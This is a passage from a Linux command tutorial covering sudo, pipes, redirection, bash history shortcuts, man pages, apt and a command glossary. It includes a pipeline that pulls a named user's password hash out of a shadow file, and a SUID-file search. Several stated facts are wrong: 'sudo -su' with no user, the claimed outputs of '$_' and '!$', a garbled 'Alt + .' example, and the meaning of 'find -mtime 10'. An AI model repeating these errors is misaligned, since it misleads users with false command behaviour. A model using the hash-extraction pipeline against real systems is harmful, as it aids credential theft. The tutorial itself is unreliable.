```bash
sudo -su
```

**Example**:

- **Switch to Root Shell**:

  ```bash
  sudo -su
  ```

  This command switches to a root shell, allowing you to execute commands with root privileges. It is equivalent to `sudo su` or `sudo -s`.

- **Switch to Another User**:

  ```bash
  sudo -su username
  ```

  This command switches to the specified user and provides a shell for that user. This is useful when you need to perform tasks as a different user without logging out and logging back in.

### `sudo -l` (List Privileges)

The `sudo -l` option is used to display the allowed (and forbidden) commands for the invoking user on the current host. This can be helpful to check what commands you are permitted to run with `sudo`.

**Basic Usage**:

```bash
sudo -l
```

This command lists the commands you are allowed to run (and any restrictions) with `sudo` on the current host. It provides an overview of your sudo privileges, helping you understand what administrative tasks you can perform.

## Utilizing Linux Commands Effectively

To maximize your efficiency with Linux commands, practice combining them using pipes (`|`) and redirections (`>`, `>>`). These tools allow you to chain commands together and manage output, enhancing your ability to manipulate data, manage Linux systems, automate tasks, and troubleshoot issues more effectively. Here are some insights and examples to help you master these powerful features.

### Combining Commands with Pipes

Pipes (`|`) are used to pass the output of one command as input to another. This allows for the efficient processing of data through multiple filters or operations sequentially. Here are some examples:

This command lists all processes but only displays those containing "nginx".

- **Filtering Process List**: You can use `ps` to get a list of processes and `grep` to filter this list:

  ```bash
  ps aux | grep nginx
  ```

This command displays the contents of `access.log`, sorts them, and removes any duplicate lines.

- **Sorting File Contents**: Combine `cat`, `sort`, and `uniq`:

  ```bash
  cat access.log | sort | uniq
  ```

This command calculates the space used by files in a directory and sorts the output numerically.

- **Monitoring Disk Usage**: You can use `du` to report disk usage and `sort` to order the results by size:

  ```bash
  du -h /path/to/directory | sort -n
  ```

This command displays the contents of the `shadow` file, filters the line starting with `frank:`, and then extracts Frank's password hash.

- **Extracting a Specific User's Hash**: You can use `cat` to display the file contents and `grep` to filter for a specific user, followed by `cut` to extract the hash:

  ```bash
  cat shadow | grep '^frank:' | cut -d ':' -f 2
  ```

  Explanation of the command:
  
  - `cat shadow`: Outputs the contents of the file named `shadow`.
  - `grep '^frank:'`: Filters the lines to only include those starting with `frank:`.
  - `cut -d ':' -f 2`: Cuts the line using `:` as a delimiter and selects the second field, which contains Frank's password hash.

### Redirections in Commands

Redirections are used to direct the output of commands to files or other output streams, such as overwriting (`>`) or appending (`>>`) to files. This is useful for logging and data storage.

- **Creating a Log File**:

  ```bash
  echo "Check complete" > check.log
  ```

  This command writes "Check complete" into `check.log`, overwriting existing contents.

- **Appending to a Log File**:

  ```bash
  date >> operations.log
  ```

  This appends the current date and time to `operations.log` without erasing its contents.

- **Error Redirection**:
  You can also redirect error messages to a different file than standard output:

  ```bash
  find / -name example.txt > found.log 2> errors.log
  ```

  This command tries to find `example.txt` starting from the root directory, logging outputs and errors to separate files.

### Advanced Command Chaining

Beyond simple pipes and redirections, Linux commands can be combined using logical operators (`&&` and `||`) to execute based on the success or failure of previous commands.

- **Conditional Execution**:

  ```bash
  [ -d /backup ] && echo "Backup directory exists." || echo "No backup directory found."
  ```

  This command checks if the `/backup` directory exists; it prints a confirmation if it does, otherwise, it alerts that it's not found.

- **Sequential Task Execution**:

  ```bash
  make && make test && make install
  ```

  This runs `make`, and if it succeeds, it runs `make test`, and if that succeeds, it finally runs `make install`. Each command executes only if the preceding command succeeds, ensuring each step is completed properly before moving on.

### Using Bash History and Shortcuts

Bash offers several powerful shortcuts and history features that can greatly enhance your efficiency on the command line. Here are some of the most useful:

- **`$_` - Last Argument**: This variable refers to the last argument of the previous command.

  ```bash
  echo "Hello, World!"
  echo $_  # Output: World!
  ```

- **`!!` - Repeat Last Command**: Repeats the entire last command.

  ```bash
  sudo apt update
  !!
  ```

- **`!$` - Last Argument of the Previous Command**: Similar to `$_`, but allows you to reuse it in a new command.

  ```bash
  echo "Hello, World!"
  cp !$ /home/user  # Expands to: cp World! /home/user
  ```

- **`!*` - All Arguments of the Previous Command**: Expands to all arguments from the previous command.

  ```bash
  echo one two three
  echo !*  # Output: one two three
  ```

- **`Ctrl + r` - Reverse Search Command History**: Press `Ctrl + r` and start typing to search your command history. This is useful for quickly finding and repeating past commands.

- **`^old^new` - Quick Substitution**: Quickly replace a part of the previous command and execute it.

  ```bash
  echo "Hello, World!"
  ^World^Bash  # Replaces 'World' with 'Bash' and executes: echo "Hello, Bash!"
  ```

- **`Alt + .` - Last Argument**: Insert the last argument from the previous command. Press it multiple times to cycle through arguments.

  ```bash
  echo "Hello, World!"
  cp Alt + . /home/user  # Copies "World!" to /home/user
  ```

- **`!!:n` - Specific Argument of Last Command**: Refers to specific arguments from the previous command using `!!:n`, where `n` is the argument's position.

  ```bash
  echo one two three
  echo !!:2  # Output: two
  ```

- **`!n` - Execute Command `n` from History**: Executes a command by its history number.

  ```bash
  history  # Let's say the command you want is number 15
  !15  # Executes the command at history line 15
  ```

- **`pushd` and `popd` - Directory Stack**: These commands let you navigate between directories easily. `pushd` saves the current directory and moves to a new one, while `popd` returns to the saved directory.

  ```bash
  pushd /path/to/directory  # Switch to this directory and save the current one
  popd  # Return to the saved directory
  ```

Mastering these shortcuts and history features will allow you to work more efficiently, reduce the need to retype commands, and quickly navigate through your command history.

## Using `man` Pages and `--help` for Command Documentation

Understanding how to access and navigate command documentation is essential for effectively using Linux. The `

man` (manual) pages and the `--help` option provide detailed information about commands, their options, and usage. This section covers how to use these resources with examples.

### The `man` Command

The `man` command displays the manual pages for a given command, providing detailed documentation on its usage, options, and examples.

**Basic Usage**:

```bash
man command
```

**Example**:

- Viewing the manual page for `ls`:

  ```bash
  man ls
  ```

**Navigating `man` Pages**:

- **Arrow Keys**: Scroll up and down the manual page.
- **Page Up/Page Down**: Move one screen up or down.
- **`q`**: Quit the manual page.
- **`/search_term`**: Search for a term within the manual page.
  - Example: Search for the term "directory" within the `ls` manual page:

    ```bash
    /directory
    ```

- **`n`**: Move to the next occurrence of the search term.
- **`N`**: Move to the previous occurrence of the search term.

### The `--help` Option

The `--help` option is a commonly used flag that provides quick reference information about a command, including a summary of its options, usage, and sometimes examples. This is especially useful for getting a quick overview of commands without consulting full documentation.

**Basic Usage**:

```bash
command --help
```

**Example**:

- Viewing help for the `cp` command:

  ```bash
  cp --help
  ```

This command displays a concise list of options and syntax for `cp`, helping you find the information you need without opening the full `man` page.

### Navigating `--help` Output

Like `man`, `--help` output can sometimes be extensive. Here are some techniques to make it easier to navigate and find specific information quickly:

- **Pipe to `less`**:
  - When the `--help` output is long, you can pipe it to `less` to enable scrolling through the output interactively:

    ```bash
    command --help | less
    ```

  - **Arrow Keys**: Use the arrow keys to scroll through the output line by line.
  - **Page Up/Page Down**: Move one screen up or down.
  - **`q`**: Quit the `less` viewer.

- **Search Within `--help` Output**:
  - Just like in `man` pages, you can search for specific terms in `less` by typing `/` followed by the search term.
  - **Example**: Searching for "verbose" in the `--help` output for `ls`:

    ```bash
    ls --help | less
    ```

    Then type `/verbose` within `less` and press `Enter`. Press `n` to jump to the next match and `N` to go to the previous match.

- **Using `grep` to Filter Output**:
  - Use `grep` to filter `--help` output by searching for a specific term or option directly:

    ```bash
    command --help | grep option
    ```

  - **Example**: Searching for the `recursive` option in `cp`:

    ```bash
    cp --help | grep recursive
    ```

- **Highlighting Specific Terms**:
  - To make specific terms stand out, you can use `grep` with `--color=always` and `less -R`:

    ```bash
    command --help | grep --color=always search_term | less -R
    ```

  - **Example**: Highlighting "file" in the `mv` command’s help output:

    ```bash
    mv --help | grep --color=always file | less -R
    ```

- **Advanced Grep with Context**:
  - If you want to include several lines of context around a matched term, you can use `grep` with `-A` (after) and `-B` (before) flags:

    ```bash
    command --help | grep -A 3 -B 2 term
    ```

  - **Example**: Finding and displaying three lines after and two lines before the "directory" term in `ls`:

    ```bash
    ls --help | grep -A 3 -B 2 directory
    ```

### Examples of Using `man` and `--help`

1. **Using `man` to Learn About `grep`**:

   ```bash
   man grep
   ```

   - **Search for "pattern" within the `grep` manual page**:

     ```bash
     /pattern
     ```

   - **Navigate to the next occurrence of "pattern"**:

     ```bash
     n
     ```

2. **Using `--help` to Quickly Reference `tar` Options**:

   ```bash
   tar --help
   ```

   This command lists the options available for `tar`, providing a quick reference.

### Practical Tips

- **Combine `man` with `grep`**: To find specific options quickly, you can pipe the `man` output to `grep`.

  **Example**:
  - Find all occurrences of "compress" in the `tar` manual page:

    ```bash
    man tar | grep compress
    ```

- **Print a Section of the Manual Page**: Use `man` with the `-P` option to print sections of a manual page.

  **Example**:
  - Print the "DESCRIPTION" section of the `ls` manual page:

    ```bash
    man -P "less +/DESCRIPTION" ls
    ```

Using `man` pages and the `--help` option allows you to efficiently find information about Linux commands and their options. By mastering these tools, you can become more self-sufficient in learning and troubleshooting on a Linux system.

## Advanced Package Tool

In the context of Debian-based Linux distributions like Ubuntu, `apt` stands for **Advanced Package Tool**. It is a command-line package management utility that simplifies the process of managing software packages, including installing, updating, and removing them.

### The `apt` Command

Here's a brief overview of common `apt` commands:

- **`apt update`**: This command updates the package index files from their sources. It fetches the latest information about available packages and their versions but does not install or upgrade any packages. This is typically the first step before upgrading or installing packages to ensure you have the latest information.

- **`apt upgrade`**: This command upgrades all the installed packages on the system to their latest available versions, based on the information retrieved by `apt update`.

- **`apt install <package_name>`**: This command installs the specified package. To ensure you are installing the correct package, you can use `apt-cache show <package_name>` to display detailed information about the package before installation.

- **`sudo apt install --only-upgrade <package_name>`**: This command upgrades a specific package to the latest version without upgrading other packages.

- **`apt remove <package_name>`**: This command removes the specified package but keeps the configuration files.

- **`apt purge`**: Removes the package and deletes configuration files.

- **`apt autoremove`**: This command removes packages that were automatically installed to satisfy dependencies for other packages and are now no longer needed.

- **`apt full-upgrade`**: This command performs the function of `apt upgrade`, but it may also remove currently installed packages if this is necessary to upgrade the system as a whole.

By using these commands, you can efficiently manage software packages on Debian-based systems.

### Verifying Package Installation

To verify that you are installing the correct package, you can use the following commands:

- **`apt-cache show <package_name>`**: Displays detailed information about the specified package, including its description, maintainer, and dependencies. This helps confirm that you are installing the intended package.

- **`apt search <package_name>`**: Searches for packages matching the specified name and provides brief descriptions, which can be useful for verifying the package before installation.

- **`dpkg -l | grep <package_name>`**: After installation, use this command to list installed packages and verify that the correct package is installed.

- **Launching the Installed Package**: After installation, you can launch the package (if applicable) to ensure it is functioning as expected. For example, to launch Burp Suite, you would run:

  ```sh
  burpsuite
  ```

## Glossary

Below is a comprehensive list of Linux commands and their descriptions, organized alphabetically.

| Command                          | Description                                                              |
|----------------------------------|--------------------------------------------------------------------------|
| `&&`                             | Logical AND - Executes the second command only if the first command succeeds |
| `\|\|`                           | Logical OR - Executes the second command only if the first command fails  |
| `;`                              | Command Separator - Executes the commands sequentially regardless of the success or failure of previous commands |
| `$_`                             | Refers to the last argument of the previous command.                     |
| `!!`                             | Repeats the entire last command.                                          |
| `!$`                             | Refers to the last argument of the previous command.                      |
| `!*`                             | Expands to all arguments of the previous command.                        |
| `!!:n`                           | Refers to the `n`th argument of the last command.                        |
| `!n`                             | Executes the command at line `n` in the command history.                 |
| `^old^new`                       | Replaces the first occurrence of `old` with `new` in the last command and executes it. |
| `Alt + .`                        | Inserts the last argument of the previous command; cycles through arguments if pressed repeatedly. |
| `Ctrl + r`                       | Reverse search through command history.                                  |
| `pushd`                          | Saves the current directory and switches to a new one.                   |
| `popd`                           | Returns to the directory saved by `pushd`.                               |
| `apt autoremove`                 | Removes packages that were automatically installed to satisfy dependencies for other packages and are now no longer needed |
| `apt full-upgrade`               | Performs the function of `apt upgrade`, but may also remove currently installed packages if this is necessary to upgrade the system as a whole |
| `apt install <package_name>`     | Installs the specified package                                           |
| `apt remove <package_name>`      | Removes the specified package but keeps the configuration files          |
| `apt update`                     | Updates the package index files from their sources                       |
| `apt upgrade`                    | Upgrades all installed packages to their latest available versions based on the information retrieved by `apt update` |
| `cat`                            | Concatenate and Display Files - Displays the content of one or more files on the screen |
| `cd`                             | Change Directory - Changes the current directory to a specified path     |
| `cd -`                           | Switch to the last directory you were in                                 |
| `cd ..`                          | Go up one directory level                                                |
| `cd /`                           | Change to the root directory                                             |
| `cp`                             | Copy Files and Directories - Copies files or directories from one location to another |
| `curl`                           | Transfer data from or to a server using various protocols                |
| `curl -O`                        | Save the file with its original filename                                 |
| `curl -o`                        | Save the file with a specified filename                                  |
| `curl -I`                        | Fetch the HTTP headers only                                              |
| `curl -X`                        | Specify a custom request method (e.g., GET, POST)                        |
| `curl -d`                        | Send data in a POST request                                              |
| `curl -H`                        | Pass custom header(s) to the server                                      |
| `curl -L`                        | Follow redirects                                                         |
| `curl -u`                        | Use basic HTTP authentication                                            |
| `curl -v`                        | Verbose output for debugging                                             |
| `cut`                            | Remove Sections from Each Line of Files - Extracts specific sections from each line of a file |
| `cut -d ':' -f 1 /etc/passwd`    | Extracts the first field from each line of the `/etc/passwd` file using the colon (`:`) as the delimiter |
| `cut -d ':' -f 1,3 /etc/passwd`  | Extracts the first and third fields from each line of the `/etc/passwd` file |
| `cut -d ',' -f 2,4 data.csv`     | Extracts the second and fourth fields from each line of the `data.csv` file using a comma as the delimiter |
| `df`                             | Disk Free - Displays the amount of disk space used and available on mounted filesystems |
| `find`                           | Search for Files and Directories - Searches for files and directories within a directory hierarchy |
| `find /home -user frank`         | Find all files for user "frank" under "/home"                            |
| `find / -type d -name config`    | Find the directory named "config" under "/"                              |
| `find / -perm -u=s -type f`      | Find files with the SUID bit                                             |
| `find / -mtime 10`               | Find files that were modified in the last 10 days                        |
| `find / -size +100M`             | Find files larger than 100 MB                                            |
| `free`                           | Memory Usage - Shows the amount of free and used memory in the system     |
| `grep`                           | Global Regular Expression Print - Searches for patterns within files using regular expressions |
| `grep -i`                        | Ignore case distinctions in patterns and data                            |
| `grep -r`                        | Read all files under each directory, recursively                         |
| `head`                           | Shows the first parts of files, useful for previewing logs and other text files |
| `head -n`                        | Show the first `n` lines of each file                                    |
| `kill`                           | Terminate Processes - Sends a signal to a single process, typically to stop the process |
| `kill -9`                        | Forcefully terminate a process                                           |
| `killall`                        | Terminate Processes - Sends a signal to all processes running any of the specified commands |
| `killall -9`                     | Forcefully terminate all instances of the specified commands             |
| `ln`                             | Create Links - Creates a link to a file or directory, which can be either a symbolic link (symlink) or a hard link |
| `ln -s`                          | Create a symbolic link                                                   |
| `locate`                         | Find Files - Searches for files by name across the entire file system using a database |
| `locate -i`                      | Ignore case distinctions                                                 |
| `locate -r`                      | Interpret pattern as a basic regular expression                          |
| `ls`                             | List - Lists all files and directories in the current directory          |
| `ls -a`                          | Include hidden files - Lists all files including hidden files            |
| `ls -l`                          | Detailed list - Provides detailed listing of files and directories       |
| `ls -h`                          | Human-readable format - Print sizes in human readable format (e.g., 1K, 234M, 2G) |
| `man`                            | Displays the manual pages for a given command, providing detailed documentation on its usage, options, and examples |
| `mv`                             | Move/Rename Files and Directories - Moves or renames files and directories |
| `mv -i`                          | Interactive - Prompt before overwrite                                    |
| `netstat`                        | Network Statistics - Displays network connections, routing tables, and interface statistics |
| `netstat -a`                     | Shows all listening ports and established connections                    |
| `netstat -at`                    | Lists only TCP connections                                               |
| `netstat -au`                    | Lists only UDP connections                                               |
| `netstat -l`                     | Lists ports in listening mode                                            |
| `netstat -lt`                    | Lists only TCP ports in listening mode                                   |
| `netstat -lu`                    | Lists only UDP ports in listening mode                                   |
| `netstat -s`                     | Lists network usage statistics by protocol                               |
| `netstat -st`                    | Lists only TCP protocol statistics                                       |
| `netstat -su`                    | Lists only UDP protocol statistics                                       |
| `netstat -tp`                    | Lists connections with service name and PID information                  |
| `netstat -ltp`                   | Lists listening ports with service name and PID information              |
| `netstat -i`                     | Shows interface statistics                                               |
| `netstat -ano`                   | Displays all sockets without resolving names and displays timers         |
| `ping`                           | Checks the network connection to a server                                |
| `ping -c`                        | Send `count` number of packets and then stop                             |
| `ps`                             | Process Status - Provides a snapshot of currently running processes      |
| `ps -aux`                        | Display all running processes with detailed information                  |
| `pwd`                            | Print Working Directory - Displays the current directory path            |
| `rm`                             | Remove Files or Directories - Deletes files or directories               |
| `rm -r`                          | Remove directories and their contents recursively                        |
| `rm -f`                          | Force removal of files                                                   |
| `sudo`                           | Superuser Do - Allows a permitted user to execute a command as the superuser or another user |
| `sudo -i`                        | Login Shell - Starts a login shell as the root user, simulating a full root login |
| `sudo -l`                        | List Privileges - Displays allowed (and forbidden) commands for the invoking user on the current host |
|`sudo -su` | Switch User with a Shell - Switches the current user to the superuser or another specified user and provides a shell |
| `tail`                           | Shows the last parts of files, useful for reviewing logs and other text files |
| `tail -n`                        | Show the last `n` lines of each file                                     |
| `tar`                            | Tape Archive - A utility for creating and manipulating archive files     |
| `tar -c`                         | Create a new archive                                                     |
| `tar -x`                         | Extract files from an archive                                            |
| `tar -xvf <archive_name.tar>`    | Extract files from a specified archive and show detailed output during extraction |
| `tar -t`                         | List the contents of an archive                                          |
| `tar -v`                         | Verbose - Show detailed output during operation                          |
| `tar -z`                         | To extract a gzip compressed tar archive                                 |
| `tar -f <archive-file>`          | Specify the name of the archive file to create or extract from           |
| `top`                            | Task Manager - Continuously updates and displays information about the top CPU-consuming processes |
| `wget`                           | Downloads files from the internet                                        |
| `wget -c`                        | Continue a previous download                                             |
| `wget -q`                        | Download files quietly, without showing progress                         |
| `whereis`                        | Locate the Binary, Source, and Manual Page Files for Commands - Finds locations related to a command |
| `whereis -b`                     | Locate binary files only                                                 |
| `whereis -m`                     | Locate manual sections only                                              |
| `whereis -s`                     | Locate source files only                                                 |
| `whoami`                         | Displays the current logged-in user's username                           |

---
